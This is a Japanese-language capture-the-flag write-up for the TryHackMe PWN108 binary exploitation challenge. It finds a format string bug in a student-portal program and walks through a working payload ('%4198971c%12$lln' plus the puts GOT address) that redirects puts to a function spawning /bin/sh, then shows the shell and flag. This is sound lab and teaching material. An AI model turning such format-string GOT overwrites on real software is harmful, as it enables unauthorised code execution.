---
title: TryHackMe PWN101 Writeup (8) PWN108
pubDatetime: 2026-04-26
description: TryHackMe PWN101 Challenge 8のWriteup
tags: [TryHackMe, Writeup, Pwn]
draft: false
---

## file

```shellsession
$ file ./pwn108-1644300489260.pwn108
./pwn108-1644300489260.pwn108: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b1c32d1f20d6d8017146d21dfcfc4da79a8762d8, for GNU/Linux 3.2.0, not stripped
```

## checksec

PIEがない

```shellsession
$ .venv/bin/pwn checksec pwn108-1644300489260.pwn108
[*] '/home/hat0uma/work/pwn108-1644300489260.pwn108'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

## 実行

生徒の受講記録みたいなやつ？

```shellsession
$ ./pwn108-1644300489260.pwn108
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 108

      THM University 📚
👨‍🎓 Student login portal 👩‍🎓

=[Your name]: aaa
=[Your Reg No]: 1

=[ STUDENT PROFILE ]=
Name         : aaa
Register no  : 1
Institue     : THM
Branch       : B.E (Binary Exploitation)


                    =[ EXAM SCHEDULE ]=
 --------------------------------------------------------
|  Date     |           Exam               |    FN/AN    |
|--------------------------------------------------------
| 1/2/2022  |  PROGRAMMING IN ASSEMBLY     |     FN      |
|--------------------------------------------------------
| 3/2/2022  |  DATA STRUCTURES             |     FN      |
|--------------------------------------------------------
| 3/2/2022  |  RETURN ORIENTED PROGRAMMING |     AN      |
|--------------------------------------------------------
| 7/2/2022  |  SCRIPTING WITH PYTHON       |     FN      |
 --------------------------------------------------------

```

## Ghidra

```c
void main(void)
{
  long in_FS_OFFSET;
  undefined1 local_98 [32];
  char local_78 [104];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  banner();
  puts(&DAT_00402177);
  puts(&DAT_00402198);
  printf("\n=[Your name]: ");
  read(0,local_98,0x12);
  printf("=[Your Reg No]: ");
  read(0,local_78,100);
  puts("\n=[ STUDENT PROFILE ]=");
  printf("Name         : %s",local_98);
  printf("Register no  : ");
  printf(local_78);
  printf("Institue     : THM");
  puts("\nBranch       : B.E (Binary Exploitation)\n");
  puts("\n                    =[ EXAM SCHEDULE ]=                  \n ------------------------------- -------------------------\n|  Date     |           Exam               |    FN/AN    |\n|------ --------------------------------------------------\n| 1/2/2022  |  PROGRAMMING IN ASSEMBLY     |     FN      |\n|--------------------------------------------------------\n| 3/2/2022  |  DA TA STRUCTURES             |     FN      |\n|-------------------------------------------------- ------\n| 3/2/2022  |  RETURN ORIENTED PROGRAMMING |     AN      |\n|------------------------- -------------------------------\n| 7/2/2022  |  SCRIPTING WITH PYTHON       |     FN      |\n --------------------------------------------------------");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void holidays(void)

{
  long in_FS_OFFSET;
  undefined4 local_16;
  undefined2 local_12;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_16 = 0x6d617865;
  local_12 = 0x73;
  printf(&DAT_00402120,&local_16);
  system("/bin/sh");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

## solver

### 方針

`local_78`(Reg No)が`printf(local_78)`でそのままフォーマット文字列として渡されているので、FSB(Format String Bug)がある。
目標は`holidays`関数（`system("/bin/sh")`を呼ぶ）に制御を移すこと。

また、

- NO PIE →`holidays`のアドレスは固定: `0x40123b` (= 4198971)
- Partial RELRO → GOT書き換え可能
- デバッグで確認したところ、スタック上にreturnアドレスを直接指す値はなかった

より、GOT overwriteで`puts`のGOTエントリを`holidays`に書き換えるようにする。
`printf(local_78)`の後に`printf("Institue ...")`→`puts(...)`と呼ばれるので、putsのGOTを書き換えれば直後にシェルが起動する。

GhidraのSymbol Tree→Labels→`_GLOBAL_OFFSET_TABLE_`から`puts@GOT = 0x404018`を確認。

### スタックレイアウトと引数位置の計算

| printf の引数番号 | スタック上の位置                                   |
| ----------------- | -------------------------------------------------- |
| 1〜5              | レジスタ (rsi, rdx, rcx, r8, r9)                   |
| 6                 | RSP+0x00 ← local_98 の先頭                         |
| 7                 | RSP+0x08                                           |
| 8                 | RSP+0x10                                           |
| 9                 | RSP+0x18 ← local_98 の末尾                         |
| 10                | RSP+0x20 ← local_78 の先頭 (= FSBペイロードの先頭) |
| 11                | RSP+0x28                                           |
| 12                | RSP+0x30 ← ペイロード先頭+16バイト目               |

`local_98` は32バイト（引数6〜9）、`local_78` はその直後から始まる（引数10〜）。

ペイロード先頭に `%4198971c%12$lln`（16バイト）を置くと、その直後（引数12の位置）に `puts@GOT` のアドレスを配置できる。

### ペイロード

```shellsession
$ echo -ne "" > input.bin
$ printf "%018d" 0 >> input.bin
$ echo -ne "%4198971c%12\$lln\x18\x40\x40\x00\x00\x00\x00\x00\n" >> input.bin
$ hexdump -C input.bin
00000000  30 30 30 30 30 30 30 30  30 30 30 30 30 30 30 30  |0000000000000000|
00000010  30 30 25 34 31 39 38 39  37 31 63 25 31 32 24 6c  |00%4198971c%12$l|
00000020  6c 6e 18 40 40 00 00 00  00 00 0a                 |ln.@@......|
0000002b
```

ペイロードの構造:

| オフセット | 内容                               | 役割                                                              |
| ---------- | ---------------------------------- | ----------------------------------------------------------------- |
| 0x00〜0x11 | `000000000000000000` (18バイト)    | 1回目のreadを埋める                                               |
| 0x12〜0x1b | `%4198971c`                        | 4198971文字分の出力を生成（= `holidays`のアドレス `0x40123b`）    |
| 0x1c〜0x21 | `%12$lln`                          | 引数12番目が指すアドレスに、ここまでの出力文字数を8バイト書き込み |
| 0x22〜0x29 | `\x18\x40\x40\x00\x00\x00\x00\x00` | `puts@GOT` = `0x404018`（引数12番目の位置に配置される）           |

`%4198971c` で出力文字数が `4198971` になり、`%12$lln` がその値を引数12番目のアドレス（= `0x404018` = `puts@GOT`）に書き込む。
結果、次に `puts` が呼ばれると `holidays (0x40123b)` にジャンプする。

### 実行

```shellsession
$ cat input.bin - | nc 10.146.179.24 9008
  (中略)
                                                             -1426813152@@Institue     : THM
No more exams for you enjoy your holidays 🎉
And here is a small gift for you
ls
flag.txt
pwn108
pwn108.c
cat flag.txt
THM{7urN3d_puts_in70_win}
^C
```
